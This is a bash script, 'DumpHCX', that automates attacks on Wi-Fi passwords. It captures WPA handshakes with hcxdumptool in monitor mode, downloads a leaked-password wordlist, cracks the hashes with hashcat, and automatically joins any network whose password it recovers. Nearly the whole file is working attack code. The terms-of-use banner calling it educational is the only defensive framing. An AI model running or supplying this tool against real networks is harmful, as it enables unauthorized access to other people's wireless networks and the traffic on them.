#!/bin/bash

# Coded by Ahmed Noaman with some help of ChatGPT
# email  : an758592@gmail.com
# github : https://github.com/an758592/

# Variables
tools=("hcxtools" "hcxdumptool" "wget" "gzip" "iw" "hashcat")
default_interface="wlan0"
default_wordlist="/usr/share/wordlists/cracked.txt"

# Colors for output
RED='\033[0;31m'
BLUE='\033[0;34m'
RESET='\033[0m'

# Function to print the banner
function print_banner {
    clear
    echo -e "${RED}██  ██  ██  ██████  ██████████${RESET}"
    echo -e "${RED}██  ██  ██    ██    ██      ██${RESET}"
    echo -e "${RED}██  ██  ██    ██    ████    ██${RESET}"
    echo -e "${RED}██  ██  ██    ██    ██      ██${RESET}"
    echo -e "${RED}██████████  ██████  ██    ████${RESET} - ${BLUE}DumpHCX${RESET}"
    echo ""
}

# Function to print terms and conditions
function print_terms {
    echo "=> By using this script you agree to the following terms :"
    echo "=> Usage           : The script is for educational and testing purposes only, and users must have the necessary permissions for security testing on wireless networks."
    echo "=> Responsibility  : Users are solely responsible for their actions using the script, including compliance with laws and regulations."
    echo "=> No Warranty     : The script is provided as is, without any warranties."
    echo "=> No Liability    : The author of the script are not liable for damages arising from its use."
    echo "=> Ethical Use     : Users agree to use the script ethically and responsibly, obtaining proper authorization before testing networks."
    echo "=> Compliance      : Users agree to comply with all applicable laws, regulations, and ethical guidelines."
    echo "=> Indemnification : Users agree to indemnify the author from any claims arising from their use of the script."
    echo "=> Modification    : Users may modify the script for personal use but may not distribute modified versions without permission."
    echo "=> Termination     : The author reserve the right to terminate or suspend access to the script without notice."
    echo "=> Acceptance      : By using the script, users acknowledge and agree to these terms and conditions."
    echo ""
}

# Function to check if the script is run as root
function check_root {
    if [ $(id -u) != 0 ]; then
        echo -e "${RED}> Run the script as ROOT or use sudo, and try again.${RESET}"
        exit 1
    fi
}

# Function to detect Linux distribution
function detect_distro {
    if [ -f /etc/os-release ]; then
        source /etc/os-release
        distribution="$ID"
    fi
}

# Function to install required tools
function install_tools {
    for tool in ${tools[@]}; do
        if ! command -v $tool &> /dev/null; then
            case $distribution in
                ubuntu|kali|debian|linuxmint)
                    apt update -y
                    apt install $tool -y
                    ;;
                fedora|almalinux|rocky)
                    dnf update -y
                    dnf install $tool -y
                    ;;
                *)
                    echo -e "${RED}> Install $tool MANUALLY, and try again.${RESET}"
                    exit 1
                    ;;
            esac
        fi
    done
}

# Function to set up the network interface for packet capture
function setup_network {
    ip addr
    read -p "> Enter the wireless INTERFACE to use [default=$default_interface] : " interface
    interface=${interface:-$default_interface}
    read -p "> Enter the PATH and NAME to save the capfile [/path/name] : " cap
    cap=${cap:-"$(pwd)/$(date +%T)"}
    systemctl stop wpa_supplicant.service
    systemctl stop NetworkManager.service
    systemctl daemon-reload
    ip link set $interface down
    iw dev $interface set type monitor
    ip link set $interface up
}

# Function to capture the handshake and convert it to hash
function capture_handshake {
    hcxdumptool -i $interface -w $cap.pcapng
    hcxpcapngtool -o $cap.hash -E ESSID.txt $cap.pcapng
    ip link set $interface down
    iw dev $interface set type managed
    ip link set $interface up
    systemctl start wpa_supplicant.service
    systemctl start NetworkManager.service
    systemctl daemon-reload
}

# Function to start cracking the captured hash
function start_cracking {
    read -p "> Start password cracking with HASHCAT? [y/n] : " crack
    case $crack in
        y|Y)
            read -p "> Do you want to download WORDLIST file? [1=download-it/2=already-have-it/3=use-another-wordlist] : " download
            case $download in
                1)
                    mkdir -p /usr/share/wordlists/
                    wget -O /usr/share/wordlists/cracked.txt.gz https://wpa-sec.stanev.org/dict/cracked.txt.gz
                    gunzip /usr/share/wordlists/cracked.txt.gz
                    wordlist=$default_wordlist
                    ;;
                2)
                    wordlist=$default_wordlist
                    ;;
                3)
                    read -p "> Enter the PATH and NAME to the WORDLIST [/path/name] : " wordlist
                    ;;
                *)
                    exit 1
                    ;;
            esac
            hashcat -a 0 -m 22000 $cap.hash $wordlist -o $cap.hacked
            while IFS=: read -r _ _ _ SSID PASSWORD; do
                if [[ -n $SSID && -n $PASSWORD ]]; then
                    echo -e "${RED}> Adding network SSID: $SSID with PASSWORD: $PASSWORD ${RESET}"
                    nmcli connection add type wifi con-name $SSID ifname $interface ssid $SSID wifi-sec.key-mgmt wpa-psk wifi-sec.psk $PASSWORD
                else
                    echo -e "${RED}> No network has been hacked.${RESET}"
                fi
            done < $cap.hacked
            ;;
        *)
            exit 0
            ;;
    esac
}

# Function to clean up temporary files
function cleanup {
    echo -e "${BLUE}> Cleaning up temporary files...${RESET}"
    rm -f $cap.pcapng
    echo -e "${BLUE}> Done.${RESET}"
}

# Main script execution starts here
print_banner
print_terms

read -p "> Do you agree with these TERMS? [y=YES-continue/n=NO-exit] : " terms
case $terms in
    y|Y)
        check_root
        detect_distro
        install_tools
        setup_network
        capture_handshake
        start_cracking
        cleanup
        ;;
    *)
        echo -e "${RED}> You are UNAUTHORIZED to use the Script.${RESET}"
        exit 1
        ;;
esac
